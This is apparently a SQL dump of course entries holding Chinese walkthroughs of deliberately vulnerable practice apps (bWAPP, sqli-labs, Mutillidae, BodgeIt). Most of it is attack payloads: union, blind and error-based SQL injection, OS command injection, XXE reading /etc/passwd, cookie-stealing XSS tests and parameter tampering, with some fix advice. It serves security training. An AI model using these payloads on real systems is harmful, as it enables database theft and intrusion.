\r\nhttp://127.0.0.1:65412/?size=32\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?size=9999999\r\n5 参考链接\r\nhttps://github.com/stamparm/DSVW\r\nhttps://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29\r\nhttps://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29\r\nhttps://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_%28OTG-INPVAL-004%29\r\nhttps://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29\r\nhttps://www.owasp.org/index.php/XPATH_Injection\r\nhttp://www.w3school.com.cn/xpath/\r\nhttps://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29\r\nhttps://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29\r\nhttps://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29\r\nhttp://blog.knownsec.com/2015/03/jsonp_security_technic/\r\nhttps://sobug.com/article/detail/11\r\nhttps://www.owasp.org/index.php/Content_Spoofing\r\nhttps://www.owasp.org/index.php/Testing_for_Clickjacking_%28OTG-CLIENT-009%29\r\nhttps://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet\r\nhttps://www.owasp.org/index.php/Full_Path_Disclosure\r\nhttps://www.imperva.com/resources/glossary?term=source_code_disclosure\r\nhttps://www.owasp.org/index.php/Path_Traversal\r\nhttps://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion\r\nhttps://www.owasp.org/index.php/HTTP_Response_Splitting\r\nhttp://www.moqifei.com/archives/609\r\nhttps://www.owasp.org/index.php/Denial_of_Service', '', '1', null);
INSERT INTO `coursetemplete` VALUES ('12', 'bwapp-一个集成了了常见漏洞的 web 应用程序', '2019-04-29', '注意：第一次创建应事先访问/install.php来创建数据库！0x00 HTML Injection - Reflected (GET)\r\n【Low】\r\n\r\n<a href=\"http://www.baidu.com\">OnClick</a>\r\n\r\n\r\n\r\n\r\n【medium】\r\n\r\n%3ca href=http://www.baidu.com%3eClick%3c/a%3e\r\n\r\n\r\n0x01 HTML Injection - Reflected (POST)\r\n【Low】\r\n\r\n<a href=\"http://www.baidu.com\">OnClick</a>\r\n\r\n\r\n【medium】\r\n\r\n%3ca href=http://www.baidu.com%3eClick%3c/a%3e\r\n\r\n\r\n0x02 iFrame Injection\r\n\r\n?ParamUrl=http://www.baidu.com\r\n\r\n\r\n0x03 OS Command Injection\r\n\r\nExploit(Low)\r\n\r\nwww.nsa.gov;id\r\n\r\n\r\nExploit(medium)\r\n\r\nwww.nsa.gov|id\r\n\r\n\r\n0x04 PHP Code Injection\r\n\r\n?message=phpinfo()\r\n\r\n\r\n0x05 SQL Injection (GET/Search)\r\n\r\nExploit(Low)\r\n\r\n-1 %\'+union+select+1,2,3,4,version(),6,7 --+\r\n\r\n\r\n0x06 SQL Injection (GET/Select)\r\n\r\nExploit(Low)\r\n\r\n?movie=-1 union select 1,2,3,4,version(),6,7\r\n\r\n\r\n0x07 SQL Injection (POST/Search)\r\n\r\ntitle=Iron+Man%\'UNION SELECT 1,2,3,4,version(),6,7  #\r\n\r\n\r\n0x08 SQL Injection (POST/Select)\r\n\r\nmovie=-1 UNION SELECT 1,2,3,4,version(),6,7\r\n\r\n\r\n0x09 SQL Injection (AJAX/JSON/jQuery)\r\n\r\nhttp://192.168.0.32/bWAPP/sqli_10-2.php?title=I%%27+UNION+SELECT+1,2,3,4,version(),6,7+--+\r\n\r\n\r\n0x10 SQL Injection (CAPTCHA)\r\n\r\n?title=Iron+Man%\' UNION SELECT 1,2,3,4,version(),6,7 --+\r\n\r\n\r\n0x11 SQL Injection (Login Form/Hero)\r\n\r\nsuperhero\' or 1=1#\r\n\r\n\r\n0x12 SQL Injection (Login Form/User)\r\n\r\nlogin=\' and 0 UNION SELECT 1,2,\'356a192b7913b04c54574d18c28d46e6395428ab\',4,5,6,7,8,9#\r\n&password=1\r\n&form=submit\r\n\r\n\r\n0x13 SQL Injection - Stored (Blog)\r\n\r\n\',(select version()))#\r\n\r\n\r\n0x14 SQL Injection - Stored (User-Agent)\r\n\r\nUser-AgentL: 123\',(select version()))#\r\n\r\n\r\n0x15 SQL Injection - Stored (XML)\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE copyright [<!ENTITY test SYSTEM \"file:///etc//passwd\">]>\r\n<rest>\r\n  <login>&test;</login>\r\n  <secret>login</secret>\r\n</rest>\r\n\r\n\r\n0x16 SQL Injection - Blind - Boolean-Based\r\n\r\n?title=Iron Man \' and (substr((select version()),1,1)=5) --+\r\n\r\n\r\n0x17 SQL Injection - Blind - Time-Based\r\n\r\n?title=Iron Man\' and (if((substr((select version()),1,1)=5),sleep(5),null)) --+\r\n\r\n\r\n0x18 SQL Injection - Blind (WS/SOAP) \r\n\r\n?title=Iron Man \' and (substr((select version()),1,1)=5) --+\r\n\r\n\r\n0x19 XML/XPath Injection (Login Form)\r\n\r\nhttp://192.168.0.32/bWAPP/xmli_1.php\r\n?login=\' or \'1\'=\'1\r\n&password=\' or \'1\'=\'1\r\n&form=submit\r\n\r\n\r\n0x20 Broken Auth. - CAPTCHA Bypassing\r\n\r\n\r\n\r\n0x21 Broken Auth. - Forgotten Function\r\n\r\n\r\n\r\n0x22 Broken Auth. - Insecure Login Forms\r\n\r\n\r\n\r\n0x23 Broken Auth. - Password Attacks\r\n\r\n\r\n\r\n0x24 Broken Auth. - Weak Passwords\r\n\r\n\r\n\r\n0x25 Session Mgmt. - Administrative Portals\r\n\r\n\r\n\r\n0x26 XSS - Reflected (GET)\r\n\r\n<script>alert(document.cookie)</script>\r\n0x27 XSS - Reflected (POST)\r\n\r\n<script>alert(document.cookie)</script>\r\n0x28 XSS - Reflected (JSON)\r\n\r\n<img src=1 onerror=alert(1) />\r\n0x29 XSS - Reflected (AJAX/JSON)\r\n\r\n<img src=1 onerror=alert(1) />\r\n0x30 XSS - Reflected (Back Button)\r\n\r\nReferer: \'\" onmousemove=\"alert(1)\"\r\n修改请求包referer字段\r\n0x31 XSS - Reflected (Custom Header)\r\n\r\nbWAPP: <script>alert(1)</script>\r\n增加请求包字段\r\n\r\n\r\n0x32 XSS - Reflected (Eval)\r\n\r\n?date=alert(document.cookie)\r\n\r\n\r\n0x33 XSS - Reflected (HREF)\r\n\r\n><script>alert(1)</script>\r\n\r\n\r\n0x34 XSS - Reflected (Login Form)\r\n\r\nlogin=\' or 1=1 \r\n&password=<script>alert(1)</script>\r\n&form=submit\r\n\r\n\r\n0x35 XSS - Reflected (PHP_SELF)\r\n\r\n<script>alert(document.cookie)</script>\r\n0x36 XSS - Reflected (Referer)\r\n\r\n<script>alert(document.cookie)</script>\r\n\r\n\r\n0x37 XSS - Reflected (User-Agent)\r\n\r\n<script>alert(document.cookie)</script>\r\n\r\n\r\n0x38 XSS - Stored (Blog)\r\n\r\n<script>alert(document.cookie)</script>\r\n0x39 XSS - Stored (User-Agent)\r\n\r\nUser-Agent: <script>alert(document.cookie)</script>\r\n\r\n\r\n0x40 Insecure DOR (Order Tickets)\r\n\r\n(Low)\r\nticket_quantity=15&ticket_price=0&action=order\r\n修改 数据包 ticket_price 的值\r\n\r\n\r\n(medium)\r\nticket_quantity=15&ticket_price=0&action=order\r\n在 请求包中增加ticket_price 参数 并赋值。', null, '1', null);
INSERT INTO `coursetemplete` VALUES ('13', 'sqli-labs- sql注入的程序员闯关游戏', '2019-04-29', 'Less-1\n判断是否存在注入：\n$ http://127.0.0.1/sqli-labs-master/Less-1/?id=1](http://127.0.0.1/sqli-labs-master/Less-1/?id=1)\'\n\n即加一个单引号闭合一下变量试一试。\n\n\n\n\n\n\nimage.png\n\n可以看到报错了，我们可以猜测在id传参过程中使用的就是id={’$id’}这种方法。然后进行注入。\n猜测字段数：\n\n$ http://127.0.0.1/sqli-labs-master/Less-1/?id=1\'  order by 3 -- #\n\n后面的-- #是两个注释，mysql中有-- （注意两杠后面有一个空格）和#两种注释方法，我的习惯是两种都加，防止有过滤。也可以不使用过滤，但是需将最后还存在的一个单引号进行闭合防止出错。\n获取数据库名，数据库用户等信息：\n$ http://127.0.0.1/sqli-labs-master/Less-1/?id=-1\'  union select 1,database(),user()  -- #\n\n\n\n\n\n\nimage.png\n\n可以看到已经获取到了敏感的信息了，注意此时因为前面报错可以看到有limit 0,1我们可以知道此处如果需要输出我们union查询出的信息要将前面的位占了，即使前面的输出为不存在。可以看到我是将id的值写为负值，然后将输出的位置就让给了后面我们需要输出的信息，这个技巧在有输出限制的时候十分重要。\n然后还有一点，我们上面猜测出了字段数为3，但这里输出的只有2个，所以我们union查询要保证字段数一样，不足的补数字，或者null。然后第一个是没有输出的，所以我将需要输出的写在了后面两个。\n接下来的一些注入就很简单了，利用mysql自带的information_schema便可以得到很多我们需要的数据了，进行脱裤。这里可以利用information_schema这个库的原因是我们是root权限，如果不是root权限，只对指定数据库存在一定的权限，这时我们就要结合盲注进行测试了。盲注的话则需要利用工具来辅助，如sqlmap等。\n\nLess-2\n判断是否存在注入：\n$ http://127.0.0.1/sqli-labs-master/Less-2/?id=1](http://127.0.0.1/sqli-labs-master/Less-2/?id=1)\'\n\n看看这一次的报错和上一次的有什么不一样\n\n\n\n\n\n\nimage.png\n\n这次的报错是：’’ LIMIT 0,1 ‘\n可以看到这里第一个和最后一个单引号是语句里面的，中间一个使我们写入的，而且刚好是成对的，所以猜测这里的id是没有符号扩起来的。语句可能为id={$id}，所以我们之间在后面写入语句。\n猜测字段数：\n\n$ http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 3\n\n获取数据库名，数据库用户等信息：\n$  http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,database(),user() -- #\n\n这个较为简单，比上一个还为简单。结合上面一个的来分析看看，一般传参id为int型都是没有符号闭合。\nLess-3\n判断是否存在注入：\n$  http://127.0.0.1/sqli-labs-master/Less-3/?id=1\'\n\n查看报错：\n\n\n\n\n\n\nimage.png\n\n分析报错情况，这里是有一个括号5个单引号，其中一个是我们写入的，所以闭合应该是利用单引号和括号进行闭合的。继续进行测试。\n猜测字段数：\n\n$  http://127.0.0.1/sqli-labs-master/Less-3/?id=1\') order by 3 -- #\n\n获取数据库名，数据库用户等信息：\n$  http://127.0.0.1/sqli-labs-master/Less-3/?id=-1\') union select 1,database(),user() -- #\n\n后面的可以继续尝试注入。\nLess-4\n判断是否存在注入：\n$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1\'\n\n我的天，这次竟然没有报错！没事换一个：\n$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1”\n\n这次报错了：\n\n\n\n\n\n\nimage.png\n\n报错是：\'\"1\"\") LIMIT 0,1\'\n分析可知这个的传参是被括号和双引号闭合的。继续：\n猜测字段数：\n\n$  http://127.0.0.1/sqli-labs-master/Less-4/?id=1\")  order by 3 -- #\n\n获取数据库名，数据库用户等信息：\n$  http://127.0.0.1/sqli-labs-master/Less-4/?id=-1\")  union select 1,database(),user() --  #\n\n继续可以自己进行尝试。\nLess-5\n这个页面我们先说一下，无论我们id传的是多少，页面显示的都是YOU ARE IN……..没有输出！！！那我们怎么获取我们需要的数据信息！！！这个时候就只能盲注了，利用盲注来获取信息。\n判断是否存在注入：\n$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1\'\n\n报错了less-1一样，可知sql语句应该是一样的所以我们可以利用一样的注入语句：\n猜测字段数：\n$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1\' order by 3 -- #\n\n页面返回YOU ARE IN……..说明正常，报错了就说明不对。接下来因为没有输出所以我们进行盲注，根据返回有没有报错来判断我们的语句是否正确。\n一些简单的：\n$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1\'  and length(user())>0  -- # //判断是否为mysql\n$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1\'  and ord(mid(user(),1,1))=114  -- #\n$  //返回正常说明数据库权限为root\n\n获取敏感数据信息：\n$  http://127.0.0.1/sqli-labs-master/Less-5/?id=1\' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))>105 -- #\n\n我们来看一下这个语句的原理：\n首先是ord函数，mysql中ord和ascii函数一样是将字符转换为ascii码。\n然后mid函数和substring一样是截取字符串的指定位置的字符的函数，比如上面我们mid(string,6,1)表示截取string这个字符串的第六位开始截取一个。然后中间是获取我们当前的数据库名，并转换为字符（as char）后面的0x20十六进制ascii表示空格。\n最后利用获取到的acsii码和我们指定的ascii进行对比来一个一个获取我们的想要的信息。比如我们这里和105对比，如果正确就继续猜，可利用二分法猜解效率更高。这里我们可以尝试看到=105时返回正常，说明当前数据库名的第六个字符就是105，查询表可知就是i。和前面得出的数据库名对比：security\n接下来可以利用返回的正确与否来一步一步猜解出我们所需要的信息。但是这样往往很耗费时间，手工来基本不太可能，所以一般都是利用工具来可以利用sqlmap。这里主要讲的是手工，所以就不演示了。\nLess-6\n判断是否存在注入\n$  http://127.0.0.1/sqli-labs-master/Less-6/?id=1\" and sleep(5)  -- #\n\n这里利用了sleep函数，基于时间的盲注。我们可以看到使用sleep函数后网站延迟了5秒说明我们插入的语句被执行了。存在注入。\n这里就说说mysql中的sleep函数在注入中的作用，一般在页面说明一点返回都没有，所以语句都无返回的时候就会利用到sleep这个函数来确定我们的语句有没有被执行。一般基于布尔的盲注比基于时间的盲注少见很多。\nLess-6和less-5基本相同，只是闭合用的符号不同。所以就不多说了。\nLess-7\n判断注入：\n$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3\'\n\n我们可以发现只有在加单引号后报错，但是这次后台对报错进行了处理，使我们无法从报错中得出敏感的信息，所有错误都显示语法错误。但是我们发现只有在加单引号后报错，加双引号或者其他的都不报错，所有这个单引号肯定有问题，我们利用单引号进行进一步注入：\n$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3\' and sleep(5) -- #\n\n发现还是错误，我感到十分奇怪，于是没有利用过滤，而是构造语句将后面的遗留的一个单引号闭合进行测试：\n$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3\' and sleep(5) or \'a\'=\'a\n\n返回正常，并且浏览器睡眠5s，说明语句执行成功。这时候应该可以猜测应该是注释的符号被过滤的，我换url编码也不行。所以这里不能继续使用注释，需要自己构造将后面的单引号进行闭合。\n获取敏感数据信息：\n$   http://127.0.0.1/sqli-labs-master/Less-7/?id=3\' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and \'a\'=\'a\n\n正常返回，之后的注入就和之前的一样了。\nLess-8\n这一个和第七个其实差不多，主要就是把报错全部过滤了，如果错误就没有返回，正确就返回you are in……但是其实都一样，两个不同的返回我们就可以利用基于布尔的盲注进行测试：\n判断是否存在注入：\n$    http://127.0.0.1/sqli-labs-master/Less-8/?id=3\'\n\n加单引号之后返回空白，说明报错，然后继续测试：\n$    http://127.0.0.1/sqli-labs-master/Less-8/?id=3\' and sleep(5)  -- #\n\n这次可以使用注释。。。\n获取敏感数据信息：\n$   http://127.0.0.1/sqli-labs-master/Less-8/?id=3\'  AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105  -- # \n\nLess-9\n哇，这一次很厉害了，无论输入什么返回都是一样的。\n$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3\'\n\n但是肯定是有注入的，这个测试肯定是无论输出什么直接一个echo。。所以我们使用sleep看看：\n$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3\' and sleep(5) and \'a\'=\'a\n$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3\' and sleep(5) -- #\n\n果然，一次就中，很稳。还是存在注入的只是无法根据返回来判断，这就是典型的需要利用时间盲注的案例了。进一步获取信息：\n获取敏感数据信息：\n$    http://127.0.0.1/sqli-labs-master/Less-9/?id=3\'   AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- #\n\n这个时候所以语句后面都必须加一个sleep函数根据相应时间来判断我们的语句是否正确。一般sleep的时间是传输时间来回的两倍。一般取5s。可以看到我们上面这个语句执行的时候相应了5s，说明我们猜测正确，如果换为=106则可以看到很快返回，说明我们的语句猜测错误。\n可以看到我们time-base的耗时是很长了\n往往获取一两kb的数据我们要好几个小时甚至好几天，所以这个时候我们就要选择重要的数据进行获取了，比如admin表里的username，password一类的数据了。\nLess-10\n第十个只是换了个符号\n检查是否存在注入：\n$   http://127.0.0.1/sqli-labs-master/Less-10/?id=3\" and sleep(5)  -- #\n\n然后获取敏感数据：\n$   http://127.0.0.1/sqli-labs-master/Less-10/?id=3\" AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- #\n\nOk了，和第九个基本一样。\nLess-11\n到了第11个就出新花样了，可以看到这次是登录框的注入。我们尝试一下万能密码\n但是登录之后就刷新了不知道有没有成功，于是我们假设成功然后进一步测试使用order by。\n\n\n\n\n\n\nimage.png\n\n可以看到原来在下面有一个报错框，这就很方便了我们继续猜测字段数发现order by 2的时候直接刷新情况说明就是 正确的了。字段数2，然后我们尝试进一步获取敏感信息，这时候也只能利用盲注，因为没有返回：\n\n\n\n\n\n\nimage.png\n\n如图，username利用万能密码绕过，然后下面的使用：\n\n\n\n\n\nimage.png\n\n和之前的注入一样，只不过一个是get一个是post，注入的地点不一样了而已。也可以换一下使用username的框注入。只不过post的sleep的话会慢一点。\nLess-12\n这一次发现有点不一样我们，没事继续看看报错：\n\n\n\n\n\n\nimage.png\n\n显示的语法错误处是：\'order by 3 -- #\") LIMIT 0,1\'\n可以猜测出闭合的类型需(“”)\n继续：\n\n\n\n\n\n\nimage.png\n\n好了！成功了，之后其实都一样了，就不演示了。\nLess-13\n这个和上一个差不多：\n\n\n\n\n\n\nimage.png\n\n单引号加括号！\n\nLess-14\n首先看看有没有报错，然后利用报错写植入语句，发现无论怎么写都没有报错，不存在报错，那就继续使用sleep或者用order by测试看看：\n\n\n\n\n\n\nimage.png\n\n发现过滤报错并没有过滤完全，还是存在报错的，所以看出有注入点。接着进行注入。\n\n\n\n\n\n\nimage.png\n\nSleep函数也成功执行！\n敏感信息查询：\n这个也和上面的一样，只不过单引号换成了双引号，记住加sleep不然不能判断猜解是否正确。\n\nLess-15\n这个同样没有报错，只能进行手工进行猜测，利用sleep函数进行测试。\n实验发现这个注入和less-11的语句是一样的只不过没有报错，所以按less-11的注入语句即可。\n\n\n\n\n\n\nimage.png\n\n使用下面的语句判断：\n\n$   \' or 1=1 and  length(user())>0 and sleep(5) -- #\n$   \' or 1=1 AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(database()  AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),6,1))=105 and sleep(5)  -- #\n\nSleep了5s的时间。\nLess-16\n这个很挺难猜的。不过也就几个组合，括号+单引号，括号+双引号，单引号，双引号。手工的话一般多猜解几次就可以猜出来的。\n\n\n\n\n\n\nimage.png\n\n其他的就和之前的差不多了，注入语句稍微替换一下就行！\n\nLess-17\n这一个就有一些不一样了，可以看到首页显示的是[PASSWORD RESET]密码重置，。尝试一个万能密码和注入检查试试：\n\n\n\n\n\n\nimage.png\n\n\n\n\n\n\nimage.png\n\n哇，还被骂是辣鸡hacker，很难受。我们重新理一下思路，重置密码就是更新数据库里面的数据，这时候往往使用的是update语句，所以这时候我们使用之前的语句可能就会出错。\n我们来猜测一下这个页面的sql语句是：update table set password=’newpassword’ where username = ‘name’;所以我们先猜测一个username然后进行后续的测试。\n我们随机输入一个比如admin密码123456后提示密码更改成功，然后进一步尝试，用户名为admin在密码处进行注入：\n\n$   \' or 1=1 and sleep(5) -- #\n\n\n\n\n\n\nimage.png\n\nOk，可以看到成功注入了，这个时候利用盲注猜解来获取数据信息啦！\n在实战过程中密码重置是一个很有可能出现sql注入漏洞的地方，所以之后可以重点关注！\n\nLess-18\n这个一进来就看到了ip，这个很可怕，所以我们在做测试的时候注意，很多时候我们的ip是会被监测的，所以尽量用虚拟机，anyway，想办法避免不必要的麻烦。废话不多说，继续测试.\n但是我发现我试了很多方法都不行，卡了挺久的，无论是编码转换绕过还是宽字节注入都不行，最后实在不行先成功登陆了一个看一下，发现登陆成功后有这个提示框：\n\n\n\n\n\n\nimage.png\n\n思考思考，意思就是这里有输出的，your user agent。Agent！！好像挺熟悉的，在结合这个测试的题目叫header injection。是不是可以抓包冲user-agent来注入，然后输出我们需要的信息！！！！直接用burpsuite来试试：\n登陆一个正确的用户，然后bp抓包更改user-agent为：\n\n$   \' and updatexml(1,concat(0x3a,database()),1))#\n\n这里输出三个的原因是我们useragent里面有三个字段，用前后两个1来占位输出。Concat是字符串连接的函数，0x3a是：的十六进制。\n看看结果：\n\n\n\n\n\n\nimage.png\n\n可以看到我们查询的database()已经被输出出来了。现在我们可以利用这个输出我们想要获取的信息了。至于这个注入产生的原因我们可以看一下源码：\n\n\n\n\n\n\nimage.png\n\n可以看到因为我们这里把我们登陆获取的user-agent信息给输入进了数据库，而这里的代码对我们传入的参数没有经过任何过滤或者检验。大家也可以看一下登录框的检验，利用了php中的很多检验函数，mysql_real_escape_string这个函数。然后检验主要是check_input这个函数，有兴趣的同学可以研究一下！\nLess-19\n这个有上面的经验就不把目标放在登录框，我们先看看成功登陆的显示情况：\n\n\n\n\n\n\nimage.png\n\n返回的是url，很稳，很明显了我们的注入点就是头部的Referer部分，继续抓包重发一下：\n\n$  \' or updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema=\"security\" limit 0,1)),1))#  //获取表名\n$  \' or updatexml(1,concat(0x3a,(select column_name from information_schema.columns where table_name=\"user\" limit 0,1)),1))#     //获取指定表字段名\n\n先讲一下语句，利用mysql自带的information_schema数据库获取数据，注意一定要加limit限制，因为只能一次一个数据，否则会报错。\n查看结果：\n\n\n\n\n\n\nimage.png\n\n后面的也不多说啦，大家可以自己尝试。\n\nLess-20\n继续登陆一个正确的用户看看：\n\n\n\n\n\n\nimage.png\n\n我以为次会没有输出的，但是很意外，这次输出的数据有点多，但是很明显这次cookie就是目标了。看到提示cookie里面的信息有uname还有时间。Post传输的数据都在cookie里面，这次有点不一样，先登录，然后刷新，抓包：\n\n\n\n\n\n\nimage.png\n\n更改的是图中指出的部分！我们构造一下语句，其实这里就很好注入了，就和之前的注入语句一样：\n$  uname=qwe\' union select 1,user(),database()-- #\n\n其实语句大家应该都很熟悉了。。。看结果：\n\n\n\n\n\n\nimage.png\n\n好了，接下来就很简单了。\n\nLess-21\n奋战奋战！！\n看看登陆信息：\n\n\n\n\n\n\nimage.png\n\n这次的uname很奇怪，但是老司机一看就知道是编码转换之后的，所以试一试。果然是base64编码，所以这个其实和上一个差不多，只不过注入的时候转换一下编码就可以了！\n这个的是利用单引号和括号闭合的，多尝试一下根据报错就会知道，这之前就说过所以不重复了。\n抓包：\n\n\n\n\n\n\nimage.png\n\n更改cookies就可以。\n注入语句：\n$  cXdlJykgdW5pb24gc2VsZWN0IDEsdXNlcigpLGRhdGFiYXNlKCktLSAj\n$  //就是20题的qwe\') union select 1,user(),database()-- #\n\n抓包重发：\n\n\n\n\n\n\nimage.png\n\n出来了。\n\nLess-22\n先看看登陆情况，发现和上一个一样，所以没什么新奇的，写语句base64转换一下，然后根据报错猜测应该是双引号闭合的，所以其他都很简单了。\n语句：\n$   InVuaW9uIHNlbGVjdCAxLHVzZXIoKSxkYXRhYmFzZSgpIw==\n$   //“union select 1,user(),database()#\n\n看结果：\n\n\n\n\n\n\nimage.png\n\n好了。\n\n', null, '1', null);
INSERT INTO `coursetemplete` VALUES ('14', 'nowasp-Multillidae: Test Your Hackers Skills!', '2019-04-29', 'NOWASP - Multillidae特点：\r\n可以使用XAMMP安装在Linux，Windows XP和Windows 7上\r\n通过将项目文件放入XAMPP的“htdocs”文件夹中轻松安装。\r\n已经预装在Rapid7 Metasploitable 2上\r\n已经预装在Samurai Web测试框架（WTF）上\r\n包含十几个漏洞和挑战\r\n只需单击一次“设置”按钮，系统本身就可以恢复为默认值\r\n可以在安全模式和不安全模式之间切换\r\n安全和不安全源代码的源代码文件存储在同一个PHP文件中，以便于比较\r\n已经在研究生安全课程，企业网络安全培训课程中使用，并作为漏洞软件的“评估评估者”目标\r\n已经包含2个级别的提示，以帮助用户入门\r\n教学视频可在以下网址查看：http：//www.youtube.com/user/webpwnized\r\n它的更新是否发送到@webpwnized\r\nNOWASP Mutillidae已经使用Cenzic Hailstorm ARC，W3AF，SQLMAP，Samurai WTF，Backtrack，HP Web Inspect，Burp-Suite，NetSparker Community Edition和其他渗透测试工具进行了测试/攻击。\r\n\r\n\r\nRead more http://www.wiztechie.com/nowasp-multillidae-test-your-hackers-skills/', null, '1', null);
INSERT INTO `coursetemplete` VALUES ('15', 'bodgeit-一个Java编写的脆弱性WEB程序', '2019-04-29', '当我在search中输入一段\r\n\r\n alert(1)\r\n时发现，它弹出了一个窗口，这代表着，我的Javascript代码已经被执行。可以去代码里看一下，它究竟为什么要这个样子做捏？\r\n\r\n<h3>Search</h3>\r\n<font size=\"-1\">\r\n<%\r\nString query = (String) request.getParameter(\"q\");\r\n\r\nif (request.getMethod().equals(\"GET\") && query != null){\r\n        if (query.replaceAll(\"\\\\s\", \"\").toLowerCase().indexOf(\"<script>alert(\"xss\")</script>\") >= 0) {\r\n                conn.createStatement().execute(\"UPDATE Score SET status = 1 WHERE task = \'SIMPLE_XSS\'\");\r\n        }\r\n    \r\n%>\r\n<b>You searched for:</b> <%= query %><br/><br/>\r\nsearch部分的代码是这样的，我们看到，它在通过getparameter取值后，下面只判断了提交方式和不为空，满足后看到下面只对指定字符串处理了空白，再往下看直接使用了模板取值方法 <%= query %> 获取了q value, 于是，这里我们可以使用任意javascript造成xss。\r\n\r\n看到这里，问题来了，如何进行修复？ 有以下几种办法\r\n\r\n1. 通过apache commons的StringEscapeUtils.escapeHtml4(query)对参数进行处理，这里BodgeIt其实给提供了一个很好的实例\r\n\r\nStringEscapeUtils.escapeHtml4(query).replaceAll(“‘”, “&#39”);\r\n\r\n直接将query转义成实体\r\n\r\n2. 通过str.replace();\r\n\r\n这种存在缺陷，如果存在遗漏容易导致被绕过\r\n\r\n所以一般都会采用组合过滤办法，比如，如果遇到了一个int型的xss，在通过escape进行处理后，输出前，还可以再次对数据类型进行判断，非int不输出。也是一种防御的办法。\r\n\r\n继续看第二个xss\r\n\r\n第二个xss是个留言本，我们在留言本中输入xss代码时，并没有如期看到弹出了框框，在开发者模式下观察，\r\n\r\n<script></script>\r\n消失了\r\n\r\n去web目录下打开contact.jsp\r\n\r\n    // Strip script tags, because that will make everything alright...\r\n        comments = comments.replace(\"<script>\", \"\");\r\n        comments = comments.replace(\"</script>\", \"\");\r\n        // And double quotes, just to make sure\r\n        comments = comments.replace(\"\"\", \"\");\r\n观察后发现， 它应用了replace方法，对script标签进行了替换，这里因为是只处理了这一个标签，于是我们换成任意一种xss均可达到绕过的效果成功的看到了弹框，因为留言数据本身就是属于不含有特殊意义的文本数据，所以这里直接转义实体就可以，继续看第三处\r\n\r\n可以通过register.jsp注册账户，我们来看一下注册逻辑部分\r\n\r\nString username = (String) request.getParameter(\"username\");\r\nString password1 = (String) request.getParameter(\"password1\");\r\nString password2 = (String) request.getParameter(\"password2\");\r\nString usertype = (String) session.getAttribute(\"usertype\");\r\nString userid = (String) session.getAttribute(\"userid\");\r\nString debug = \"\";\r\nString result = null;\r\nboolean registered = false;\r\n\r\nif (request.getMethod().equals(\"POST\") && username != null) {\r\n    if (username == null || username.length() < 5) {\r\n        result = \"You must supply a username of at least 5 characters.\";\r\n    \r\n    } else if (username.indexOf(\"@\") < 0) {\r\n        result = \"Invalid username - please supply a valid email address.\";\r\n\r\n    } else if (password1 == null || password1.length() < 5) {\r\n        result = \"You must supply a password of at least 5 characters.\";\r\n\r\n    } else if (password1.equals(password2)) {\r\n        Statement stmt = conn.createStatement();\r\n        ResultSet rs = null;\r\n        try {\r\n            stmt.executeQuery(\"INSERT INTO Users (name, type, password) VALUES (\'\" + username + \"\', \'USER\', \'\" + password1 + \"\')\");\r\n            rs = stmt.executeQuery(\"SELECT * FROM Users WHERE (name = \'\" + username + \"\' AND password = \'\" + password1 + \"\')\");\r\n            rs.next();\r\n            userid =  \"\" + rs.getInt(\"userid\"); \r\n\r\n            session.setAttribute(\"username\", username);\r\n            session.setAttribute(\"usertype\", \"USER\");\r\n            session.setAttribute(\"userid\", userid);\r\nrequest.getParameter后，比对了对象是否相等和注册名不为空，下面的条件是取反判断，均和安全无关，目的是为了符合注册规则，在往下看， 没有进行任何处理注册信息就进入了INSERT，所以这里我们只要找一个在前端有显示注册信息的地方就可以造成xss（一般是用户名）\r\n\r\n这里可以先随便注册个用户进行尝试\r\n\r\n注册后看到，它是把用户名取到了模板当中，我们可以再去看下代码确认一下\r\n\r\n<%\r\n    if (username != null) {\r\n        out.println(\"User: <a href=\"password.jsp\">\" + username + \"</a>\");\r\n    } else {\r\n        out.println(\"Guest user\");\r\n    }\r\n%>\r\n可以看到， 用户名只判断了非空，所以这里用户名部分是可以xss的，注册一个账户\r\n\r\n test@test.com xsscode\r\n成功弹框。 